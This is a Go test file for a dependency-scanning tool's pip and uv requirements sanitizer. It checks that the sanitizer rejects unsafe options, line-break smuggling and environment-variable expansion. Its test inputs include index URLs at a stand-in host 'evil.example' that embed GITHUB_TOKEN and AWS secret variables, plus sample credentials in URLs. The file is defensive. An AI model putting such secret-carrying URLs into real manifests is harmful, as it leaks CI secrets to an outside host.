package catalog

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/ossprey/ossprey-cli/internal/warn"
)

func sanitize(t *testing.T, files map[string]string) (string, *pipSanitizer, error) {
	t.Helper()
	src := t.TempDir()
	writeTree(t, src, files)
	s := newPipSanitizer(context.Background(), t.TempDir())
	out, err := s.file(filepath.Join(src, "requirements.txt"))
	if err != nil {
		return "", s, err
	}
	data, _ := os.ReadFile(out)
	return string(data), s, nil
}

// A dependency string may hold a line break (TOML allows it); its marker must
// not smuggle a second requirement such as a local path.
func TestPipSafeRequirementRejectsLineBreaks(t *testing.T) {
	for _, spec := range []string{
		"requests; python_version >= '0'\n./local",
		"requests; python_version >= '0'\r./local",
		"requests\x00",
		`requests; python_version > "${GITHUB_TOKEN}"`,
		"${PKG}==1.0",
	} {
		if got, ok := pipSafeRequirement(spec); ok {
			t.Errorf("pipSafeRequirement(%q) kept %q", spec, got)
		}
	}
}

// Every option on an option line is judged; the first being harmless does
// not carry the rest through, and what is dropped is recorded.
func TestPipSanitizerJudgesEveryOptionOnALine(t *testing.T) {
	got, s, err := sanitize(t, map[string]string{
		"requirements.txt": "--no-index --no-binary=:all: --pre\n--prefer-binary --use-pep517\n--require-hashes\nrequests\n",
	})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "no-binary") || strings.Contains(got, "pep517") {
		t.Errorf("an unvetted option reached the copy:\n%s", got)
	}
	for _, want := range []string{"--no-index\n", "--pre\n", "--prefer-binary\n"} {
		if !strings.Contains(got, want) {
			t.Errorf("copy lacks %q:\n%s", want, got)
		}
	}
	if !slices.Contains(s.dropped, "option --no-binary") || !slices.Contains(s.dropped, "option --use-pep517") {
		t.Errorf("dropped options not recorded: %v", s.dropped)
	}
	if slices.Contains(s.dropped, "option --require-hashes") {
		t.Errorf("--require-hashes changes nothing that resolves and should not be reported: %v", s.dropped)
	}
}

// pip expands ${VAR} in a requirements file, so a repository index URL must
// not be able to carry a runner secret off the machine.
func TestPipSanitizerRefusesEnvironmentExpansionInOptions(t *testing.T) {
	got, s, err := sanitize(t, map[string]string{
		"requirements.txt": "--index-url https://evil.example/${GITHUB_TOKEN}/simple\n" +
			"--extra-index-url=https://evil.example/$\\{AWS_SECRET_ACCESS_KEY}\n-f \"${HOME}/wheels\"\nrequests\n",
	})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "${") || strings.Contains(got, "evil") {
		t.Errorf("an option naming an environment variable reached the copy:\n%s", got)
	}
	if len(s.dropped) != 3 {
		t.Errorf("dropped = %v, want all three options", s.dropped)
	}
}

// A source name at the filesystem's limit still yields a copy name under it.
func TestPipSanitizerBoundsCopyNames(t *testing.T) {
	name := strings.Repeat("r", 250) + ".txt"
	got, _, err := sanitize(t, map[string]string{"requirements.txt": "-r " + name + "\n", name: "idna\n"})
	if err != nil {
		t.Fatalf("a long include name failed: %v", err)
	}
	tok, _ := shlexSplit(strings.TrimSpace(got))
	if len(filepath.Base(tok[1])) > 64 {
		t.Errorf("copy name %d bytes long: %s", len(filepath.Base(tok[1])), tok[1])
	}
}

// Two includes whose names map to the same identifier must not overwrite
// each other's copy.
func TestPipSanitizerIncludesGetDistinctCopies(t *testing.T) {
	got, s, err := sanitize(t, map[string]string{
		"requirements.txt": "-r a-b.txt\n-r a_b.txt\n",
		"a-b.txt":          "flask\n",
		"a_b.txt":          "click\n",
	})
	if err != nil {
		t.Fatal(err)
	}
	var both string
	for _, line := range strings.Split(strings.TrimSpace(got), "\n") {
		tok, err := shlexSplit(line)
		if err != nil || len(tok) != 2 {
			t.Fatalf("bad include line %q", line)
		}
		data, _ := os.ReadFile(tok[1])
		both += string(data)
	}
	if !strings.Contains(both, "flask") || !strings.Contains(both, "click") {
		t.Errorf("an include's copy was overwritten: %q (written %v)", both, s.written)
	}
}

// Includes are repository content read before pip's timeout starts: a device,
// an oversized file or endless nesting fails the manifest instead of hanging
// or exhausting memory, and a cancelled scan stops.
func TestPipSanitizerBoundsIncludes(t *testing.T) {
	if runtime.GOOS != "windows" {
		if _, _, err := sanitize(t, map[string]string{"requirements.txt": "-r /dev/zero\n"}); err == nil {
			t.Error("an include of /dev/zero was read")
		}
	}
	big := strings.Repeat("a\n", maxPipRequirementsBytes/2+1)
	if _, _, err := sanitize(t, map[string]string{"requirements.txt": "-r big.txt\n", "big.txt": big}); err == nil {
		t.Error("an oversized include was read")
	}
	chain := map[string]string{"requirements.txt": "-r r0.txt\n"}
	for i := 0; i <= maxPipIncludeDepth+1; i++ {
		chain[fmt.Sprintf("r%d.txt", i)] = fmt.Sprintf("-r r%d.txt\n", i+1)
	}
	if _, _, err := sanitize(t, chain); err == nil || !strings.Contains(err.Error(), "nest") {
		t.Errorf("an unbounded include chain: err = %v", err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	src := t.TempDir()
	writeTree(t, src, map[string]string{"requirements.txt": "requests\n"})
	if _, err := newPipSanitizer(ctx, t.TempDir()).file(filepath.Join(src, "requirements.txt")); err == nil {
		t.Error("a cancelled scan went on sanitizing")
	}
}

// Paths written into the copy, and include values read from the source, are
// shell-style tokens: a space survives both ways.
func TestPipSanitizerQuotesPaths(t *testing.T) {
	src := filepath.Join(t.TempDir(), "my project")
	writeTree(t, src, map[string]string{
		"requirements.txt": "-r \"more reqs.txt\"\n-f 'my wheels'\n",
		"more reqs.txt":    "idna\n",
		"my wheels/.keep":  "",
	})
	dst := filepath.Join(t.TempDir(), "scratch dir")
	if err := os.MkdirAll(dst, 0o755); err != nil {
		t.Fatal(err)
	}
	s := newPipSanitizer(context.Background(), dst)
	out, err := s.file(filepath.Join(src, "requirements.txt"))
	if err != nil {
		t.Fatalf("a quoted include failed: %v", err)
	}
	data, _ := os.ReadFile(out)
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		tok, err := shlexSplit(line)
		if err != nil || len(tok) != 2 {
			t.Fatalf("line %q does not split into one option and one value", line)
		}
		if _, err := os.Stat(tok[1]); err != nil {
			t.Errorf("%s names a path that does not exist: %v", tok[0], err)
		}
	}
}

// The real pip reads those quoted paths back, from a scratch directory and a
// project with spaces in them.
func TestPipResolvesThroughPathsWithSpaces(t *testing.T) {
	realToolsOnly(t, "python3")
	requirePip(t)
	tmp := filepath.Join(t.TempDir(), "tmp dir")
	if err := os.MkdirAll(tmp, 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("TMPDIR", tmp)
	proj := filepath.Join(t.TempDir(), "my project")
	writeTree(t, proj, map[string]string{
		"requirements.txt": "--no-index\n-r \"more reqs.txt\"\n",
		"more reqs.txt":    "--no-index\n",
	})
	ctx := warn.NewContext(context.Background(), false)
	if _, err := Catalog(ctx, proj, Options{SkipVersionLookup: true}); err != nil {
		t.Fatal(err)
	}
	if got := warn.Unresolved(ctx); len(got) != 0 {
		t.Errorf("unresolved = %v\n%s", got, warn.Drain(ctx))
	}
}

// What was left out is described, never quoted: a direct reference can
// carry a credential, and the warning reaches CI logs.
func TestLeftOutNeverQuotesTheRequirement(t *testing.T) {
	src := t.TempDir()
	writeTree(t, src, map[string]string{"requirements.txt": "private @ https://deploy:hunter2@pkgs.example/p.whl?token=s3cret\n" +
		"-e git+https://ghp_abc123@github.com/o/r.git#egg=r\n--index-url=https://x/${SECRET_TOKEN}\nsecretpkg-s3cr3t.tar.gz\n"})
	s := newPipSanitizer(context.Background(), t.TempDir())
	if _, err := s.file(filepath.Join(src, "requirements.txt")); err != nil {
		t.Fatal(err)
	}
	ctx := warn.NewContext(context.Background(), true)
	c := NewPipCataloger(src)
	c.leftOut(ctx, filepath.Join(src, "requirements.txt"), s.dropped)
	out := warn.Drain(ctx)
	for _, secret := range []string{"hunter2", "s3cret", "ghp_abc123", "SECRET_TOKEN", "s3cr3t"} {
		if strings.Contains(out, secret) {
			t.Errorf("warning leaked %q:\n%s", secret, out)
		}
	}
	for _, want := range []string{"a URL or direct reference", "an editable (-e)", "--index-url naming an environment variable", "a local archive"} {
		if !strings.Contains(out, want) {
			t.Errorf("warning does not say %q:\n%s", want, out)
		}
	}
}

// With no pip, a project whose dependencies are dynamic is still unresolved.
func TestNoPipMarksDynamicDependencies(t *testing.T) {
	got := unresolvedFor(t, map[string]string{
		"pyproject.toml": "[project]\nname = \"app\"\nversion = \"0.1.0\"\ndynamic = [\"dependencies\"]\n",
	})
	if !slices.Equal(got, []string{"pyproject.toml"}) {
		t.Errorf("unresolved = %v, want [pyproject.toml]", got)
	}
}

// A pyproject that does not parse resolves nothing, so it is unresolved on
// the uv path too, unless a lock beside it covers it.
func TestMalformedPyprojectNeedsBuild(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{"pyproject.toml": "[project\nname = "})
	p := filepath.Join(dir, "pyproject.toml")
	if pyprojectNeedsBuild(p) == nil {
		t.Error("a malformed pyproject read as needing nothing")
	}
	writeTree(t, dir, map[string]string{"uv.lock": "version = 1\n"})
	if err := pyprojectNeedsBuild(p); err != nil {
		t.Errorf("a lock beside it covers it: %v", err)
	}
}

// uv expands ${VAR} in requirements files (options and requirements alike)
// and in pyproject dependencies, so a manifest naming one is never handed to
// it: the variable's value would reach a host the repository chose.
func TestUVNeverExpandsRepositoryEnvVars(t *testing.T) {
	var seen []string
	var mu sync.Mutex
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		seen = append(seen, r.URL.String())
		mu.Unlock()
		http.NotFound(w, r)
	}))
	defer srv.Close()
	t.Setenv("LEAKTEST_SECRET", "topsecret123")
	cases := map[string]map[string]string{
		"index url":     {"requirements.txt": "--index-url " + srv.URL + "/${LEAKTEST_SECRET}/simple\nrequests\n"},
		"direct url":    {"requirements.txt": "requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\n"},
		"included file": {"requirements.txt": "-r more.txt\n", "more.txt": "--extra-index-url=" + srv.URL + "/${LEAKTEST_SECRET}/simple\nrequests\n"},
		"pyproject":     {"pyproject.toml": "[project]\nname = \"app\"\nversion = \"0.1.0\"\ndependencies = [\"requests @ " + srv.URL + "/${LEAKTEST_SECRET}/requests-2.31.0-py3-none-any.whl\"]\n"},
	}
	for name, files := range cases {
		t.Run(name, func(t *testing.T) {
			realToolsOnly(t, "uv", "python3")
			proj := t.TempDir()
			writeTree(t, proj, files)
			ctx := warn.NewContext(context.Background(), false)
			if _, err := Catalog(ctx, proj, Options{SkipVersionLookup: true}); err != nil {
				t.Fatal(err)
			}
			mu.Lock()
			defer mu.Unlock()
			for _, u := range seen {
				if strings.Contains(u, "topsecret123") {
					t.Fatalf("uv sent the secret: %s", u)
				}
			}
			manifest := "requirements.txt"
			if _, ok := files["pyproject.toml"]; ok {
				manifest = "pyproject.toml"
			}
			if got := warn.Unresolved(ctx); !slices.Contains(got, manifest) {
				t.Errorf("unresolved = %v, want %s", got, manifest)
			}
			if out := warn.Drain(ctx); !strings.Contains(out, "environment variable") {
				t.Errorf("no warning says why:\n%s", out)
			}
		})
	}
}
